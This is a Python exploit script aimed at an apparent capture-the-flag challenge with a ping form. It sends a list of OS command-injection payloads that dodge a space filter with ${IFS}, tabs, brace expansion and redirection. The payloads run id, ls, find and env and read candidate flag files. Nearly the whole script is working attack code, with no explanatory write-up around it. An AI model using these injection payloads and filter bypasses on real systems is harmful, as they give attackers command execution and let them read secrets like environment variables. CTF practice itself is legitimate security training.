#!/usr/bin/env python3
import requests, re

BASE = 'https://dont-ping-fiv-ctf.tdho.st'
s = requests.Session()

def try_payload(payload, desc=''):
    r = s.post(BASE + '/', data={'host': payload}, timeout=10)
    flag = re.search(r'TDHT\{[^}]+\}', r.text)
    if flag:
        print(f"*** FLAG ({desc}): {flag.group(0)} ***")
        return True
    if 'Invalid input' in r.text or 'sneaky' in r.text:
        return False  # blocked
    # Check for command output (not in the form value field)
    # The output appears after ping stats or after the form
    if 'uid=' in r.text or '/bin' in r.text or 'flag' in r.text.lower():
        # Extract pre content
        pres = re.findall(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        for p in pres:
            if 'PING' in p or 'uid=' in p:
                print(f"OUTPUT ({desc}): {p[-300:]}")
                return 'output'
    return False

# The earlier scan showed pipe with no space worked: 127.0.0.1|id returned uid=33
# But pipe with space was blocked. So filter blocks spaces after pipe.
# Try various bypass methods

# First confirm: no-space pipe works
print("Testing basic bypass methods...")

bypasses = [
    # No space, pipe
    ('127.0.0.1|id', 'pipe-nospace'),
    ('127.0.0.1|cat${IFS}/tmp/flag.txt', 'IFS flag tmp'),
    ('127.0.0.1|cat${IFS}/etc/flag.txt', 'IFS flag etc'),
    ('127.0.0.1|cat${IFS}/flag.txt', 'IFS flag root'),
    ('127.0.0.1|cat${IFS}/flag', 'IFS flag noext'),
    # Tab instead of space
    ('127.0.0.1|cat\t/tmp/flag.txt', 'tab'),
    # Brace expansion
    ('127.0.0.1|{cat,/tmp/flag.txt}', 'brace'),
    ('127.0.0.1|{cat,/etc/flag.txt}', 'brace etc'),
    # $IFS$9
    ('127.0.0.1|cat$IFS$9/tmp/flag.txt', 'IFS9 tmp'),
    ('127.0.0.1|cat$IFS$9/etc/flag.txt', 'IFS9 etc'),
    # Using < redirection
    ('127.0.0.1|cat</tmp/flag.txt', 'redirect tmp'),
    ('127.0.0.1|cat</etc/flag.txt', 'redirect etc'),
    # Semicolon no space
    ('127.0.0.1;cat${IFS}/tmp/flag.txt', 'semi IFS tmp'),
    ('127.0.0.1;cat${IFS}/etc/flag.txt', 'semi IFS etc'),
    # Find flag location first
    ('127.0.0.1|ls${IFS}/', 'ls root'),
    ('127.0.0.1|ls${IFS}/tmp', 'ls tmp'),
    ('127.0.0.1|find${IFS}/${IFS}-name${IFS}flag*', 'find flag'),
    ('127.0.0.1|env', 'env'),
]

for payload, desc in bypasses:
    result = try_payload(payload, desc)
    if result == True:
        exit()  # Flag found
    elif result == 'output':
        pass  # printed
    elif result == False:
        print(f"  BLOCKED: {desc}")
